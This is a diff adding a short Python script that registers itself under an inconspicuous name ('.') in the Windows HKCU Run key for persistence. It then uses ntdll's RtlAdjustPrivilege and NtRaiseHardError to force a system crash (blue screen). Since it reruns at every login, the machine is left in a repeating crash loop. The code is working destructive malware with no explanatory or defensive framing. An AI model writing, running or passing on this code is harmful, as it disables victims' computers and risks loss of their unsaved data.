@@ -1,0 +1,49 @@
+Source:
+import os
+import sys
+import winreg as reg
+
+def add_to_startup():
+
+    script_path = os.path.abspath(sys.argv[0])
+
+
+    app_name = "."
+
+
+    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+
+    try:
+
+        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
+
+        reg.SetValueEx(reg_key, app_name, 0, reg.REG_SZ, script_path)
+        reg.CloseKey(reg_key)
+        print(f".")
+    except Exception as e:
+        print(f".: {e}")
+
+if __name__ == "__main__":
+    add_to_startup()
+from ctypes import windll 
+from ctypes import c_int 
+from ctypes import c_uint 
+from ctypes import c_ulong 
+from ctypes import POINTER 
+from ctypes import byref 
+nullptr = POINTER(c_int)() 
+windll.ntdll.RtlAdjustPrivilege( 
+    c_uint(19), 
+    c_uint(1), 
+    c_uint(0), 
+    byref(c_int()) 
+) 
+windll.ntdll.NtRaiseHardError( 
+    c_ulong(0xC000007B), 
+    c_ulong(0), 
+    nullptr, 
+    nullptr, 
+    c_uint(6), 
+    byref(c_uint()) 
+)
+
